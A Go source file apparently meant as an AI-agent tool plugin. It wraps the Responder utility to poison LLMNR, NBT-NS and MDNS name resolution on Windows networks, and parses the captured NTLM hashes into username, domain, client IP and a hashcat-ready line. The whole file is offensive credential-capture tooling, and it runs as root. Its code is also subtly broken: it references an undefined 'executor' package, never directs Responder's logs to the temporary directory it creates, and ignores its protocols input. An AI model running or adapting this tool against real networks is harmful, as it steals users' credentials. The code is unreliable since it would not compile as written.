package main

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"time"

	sdkinput "github.com/zero-day-ai/sdk/input"
	"github.com/zero-day-ai/sdk/toolerr"
	"github.com/zero-day-ai/sdk/exec"
	"github.com/zero-day-ai/sdk/tool"
	"github.com/zero-day-ai/sdk/types"
)

const (
	ToolName        = "responder"
	ToolVersion     = "1.0.0"
	ToolDescription = "LLMNR/NBT-NS/MDNS poisoning tool for capturing authentication hashes on Windows networks"
	BinaryName      = "Responder.py"
)

// ToolImpl implements the Responder tool
type ToolImpl struct{}

// NewTool creates a new Responder tool instance
func NewTool() tool.Tool {
	cfg := tool.NewConfig().
		SetName(ToolName).
		SetVersion(ToolVersion).
		SetDescription(ToolDescription).
		SetTags([]string{
			"credential-access",
			"network",
			"windows",
			"T1557.001", // LLMNR/NBT-NS Poisoning and SMB Relay
		}).
		SetInputSchema(InputSchema()).
		SetOutputSchema(OutputSchema()).
		SetExecuteFunc((&ToolImpl{}).Execute)

	t, _ := tool.New(cfg)
	return &toolWithHealth{Tool: t, impl: &ToolImpl{}}
}

// toolWithHealth wraps the tool to add custom health checks
type toolWithHealth struct {
	tool.Tool
	impl *ToolImpl
}

func (t *toolWithHealth) Health(ctx context.Context) types.HealthStatus {
	return t.impl.Health(ctx)
}

// CapturedHash represents a captured authentication hash
type CapturedHash struct {
	Protocol  string
	ClientIP  string
	Username  string
	Domain    string
	Hash      string
	HashType  string
}

// Execute runs Responder with the provided parameters
func (t *ToolImpl) Execute(ctx context.Context, input map[string]any) (map[string]any, error) {
	startTime := time.Now()

	// Extract parameters
	iface := sdkinput.GetString(input, "interface", "")
	if iface == "" {
		return nil, fmt.Errorf("interface parameter is required")
	}

	analyzeMode := sdkinput.GetBool(input, "analyze_mode", false)
	timeout := sdkinput.GetInt(input, "timeout", 60)
	protocols := sdkinput.GetStringSlice(input, "protocols")

	// Create a temporary directory for Responder logs
	logDir, err := os.MkdirTemp("", "responder-logs-*")
	if err != nil {
		return nil, fmt.Errorf("failed to create log directory: %w", err)
	}
	defer os.RemoveAll(logDir)

	// Build Responder command arguments
	args := t.buildResponderArgs(iface, analyzeMode, protocols)

	// Create a context with timeout
	cmdCtx, cancel := context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
	defer cancel()

	// Set up signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sigChan)

	// Execute Responder in a goroutine
	resultChan := make(chan *executor.Result, 1)
	errChan := make(chan error, 1)

	go func() {
		result, err := exec.Run(cmdCtx, exec.Config{
			Command: "python3",
			Args:    append([]string{BinaryName}, args...),
			Timeout: time.Duration(timeout+5) * time.Second, // Add buffer to timeout
		})
		if err != nil {
			errChan <- err
			return
		}
		resultChan <- result
	}()

	// Wait for completion, timeout, or interrupt
	var result *executor.Result
	select {
	case <-cmdCtx.Done():
		// Timeout reached - this is expected behavior for Responder
		result = &executor.Result{
			ExitCode: 0,
			Duration: time.Since(startTime),
		}
	case err := <-errChan:
		// Check if it's a timeout error (which is expected)
		if strings.Contains(err.Error(), "timed out") {
			result = &executor.Result{
				ExitCode: 0,
				Duration: time.Since(startTime),
			}
		} else {
			return nil, fmt.Errorf("responder execution failed: %w", err)
		}
	case result = <-resultChan:
		// Process completed normally
	case <-sigChan:
		cancel()
		return nil, fmt.Errorf("execution interrupted by user")
	}

	// Parse Responder log files to extract captured hashes
	hashes, err := t.parseResponderLogs(logDir)
	if err != nil {
		// Log parsing errors are not fatal - return what we have
		fmt.Fprintf(os.Stderr, "Warning: failed to parse some logs: %v\n", err)
	}

	// Build output
	output := map[string]any{
		"captured_hashes": t.hashesToOutput(hashes),
		"capture_time_seconds": int(result.Duration.Seconds()),
	}

	return output, nil
}

// buildResponderArgs constructs Responder command arguments
func (t *ToolImpl) buildResponderArgs(iface string, analyzeMode bool, protocols []string) []string {
	args := []string{
		"-I", iface,
	}

	// Analyze mode (passive)
	if analyzeMode {
		args = append(args, "-A")
	}

	// Disable specific protocols if needed
	// By default, Responder enables all protocols
	// We could add logic here to disable protocols not in the list

	// Verbose output
	args = append(args, "-v")

	return args
}

// parseResponderLogs parses Responder log files to extract captured hashes
func (t *ToolImpl) parseResponderLogs(logDir string) ([]CapturedHash, error) {
	var hashes []CapturedHash

	// Responder typically creates logs in the current directory or a logs subdirectory
	// Common log file patterns: HTTP-*.txt, SMB-*.txt, LDAP-*.txt
	responderLogPatterns := []string{
		"HTTP-NTLMv*.txt",
		"SMB-NTLMv*.txt",
		"LDAP-NTLMv*.txt",
		"MSSQL-NTLMv*.txt",
		"FTP-NTLMv*.txt",
	}

	// Check both the current directory and common Responder log locations
	logLocations := []string{
		".",
		"logs",
		"/usr/share/responder/logs",
		filepath.Join(os.Getenv("HOME"), ".responder", "logs"),
	}

	for _, location := range logLocations {
		for _, pattern := range responderLogPatterns {
			matches, err := filepath.Glob(filepath.Join(location, pattern))
			if err != nil {
				continue
			}

			for _, logFile := range matches {
				fileHashes, err := t.parseLogFile(logFile)
				if err != nil {
					fmt.Fprintf(os.Stderr, "Warning: failed to parse %s: %v\n", logFile, err)
					continue
				}
				hashes = append(hashes, fileHashes...)
			}
		}
	}

	return hashes, nil
}

// parseLogFile parses a single Responder log file
func (t *ToolImpl) parseLogFile(filename string) ([]CapturedHash, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var hashes []CapturedHash

	// Determine protocol from filename
	protocol := t.extractProtocolFromFilename(filename)
	hashType := t.extractHashTypeFromFilename(filename)

	// Responder log format typically contains lines like:
	// [timestamp] [SMB] NTLMv2 Client: 192.168.1.100 User: DOMAIN\username Hash: hash_value
	// Or hash entries in the format: username::domain:challenge:response

	hashRegex := regexp.MustCompile(`^([^:]+)::([^:]*):([^:]+):([^:]+):([^:]+)`)
	clientRegex := regexp.MustCompile(`Client[:\s]+(\d+\.\d+\.\d+\.\d+)`)
	userRegex := regexp.MustCompile(`User[:\s]+([^\s]+)`)

	scanner := bufio.NewScanner(file)
	var currentClientIP string

	for scanner.Scan() {
		line := scanner.Text()

		// Try to extract client IP
		if matches := clientRegex.FindStringSubmatch(line); len(matches) > 1 {
			currentClientIP = matches[1]
		}

		// Try to extract user from info lines (for context, but not strictly required)
		if matches := userRegex.FindStringSubmatch(line); len(matches) > 1 {
			_ = matches[1] // User info is available in hash line
		}

		// Try to match hash format: username::domain:challenge:response
		if matches := hashRegex.FindStringSubmatch(line); len(matches) > 5 {
			username := matches[1]
			domain := matches[2]
			// Full hash is the entire line for tools like hashcat
			hash := line

			hashes = append(hashes, CapturedHash{
				Protocol:  protocol,
				ClientIP:  currentClientIP,
				Username:  username,
				Domain:    domain,
				Hash:      hash,
				HashType:  hashType,
			})

			// Reset current context
			currentClientIP = ""
		}
	}

	if err := scanner.Err(); err != nil {
		return hashes, fmt.Errorf("error reading file: %w", err)
	}

	return hashes, nil
}

// extractProtocolFromFilename extracts protocol from log filename
func (t *ToolImpl) extractProtocolFromFilename(filename string) string {
	base := filepath.Base(filename)
	parts := strings.Split(base, "-")
	if len(parts) > 0 {
		return parts[0]
	}
	return "UNKNOWN"
}

// extractHashTypeFromFilename extracts hash type from log filename
func (t *ToolImpl) extractHashTypeFromFilename(filename string) string {
	base := filepath.Base(filename)
	if strings.Contains(base, "NTLMv2") {
		return "NTLMv2"
	}
	if strings.Contains(base, "NTLMv1") {
		return "NTLMv1"
	}
	return "NTLM"
}

// hashesToOutput converts CapturedHash slice to output format
func (t *ToolImpl) hashesToOutput(hashes []CapturedHash) []map[string]any {
	result := make([]map[string]any, 0, len(hashes))
	for _, h := range hashes {
		result = append(result, map[string]any{
			"protocol":  h.Protocol,
			"client_ip": h.ClientIP,
			"username":  h.Username,
			"domain":    h.Domain,
			"hash":      h.Hash,
			"hash_type": h.HashType,
		})
	}
	return result
}

// Health checks the Responder binary and permissions
func (t *ToolImpl) Health(ctx context.Context) types.HealthStatus {
	// Check if Responder.py binary exists
	if !executor.BinaryExists(BinaryName) {
		// Try alternative locations
		alternatives := []string{
			"/usr/bin/Responder.py",
			"/usr/share/responder/Responder.py",
			"/opt/Responder/Responder.py",
		}

		found := false
		for _, alt := range alternatives {
			if _, err := os.Stat(alt); err == nil {
				found = true
				break
			}
		}

		if !found {
			return types.NewUnhealthyStatus("Responder.py not found in PATH or common locations", map[string]any{
				"binary": BinaryName,
				"alternatives": alternatives,
			})
		}
	}

	// Check if running as root (Responder requires root for packet capture)
	if os.Geteuid() != 0 {
		return types.NewDegradedStatus(
			"Responder available but not running as root",
			map[string]any{
				"warning": "Responder requires root privileges for network poisoning",
				"note":    "Run with sudo or as root user",
			},
		)
	}

	return types.NewHealthyStatus("Responder is available and has required privileges")
}
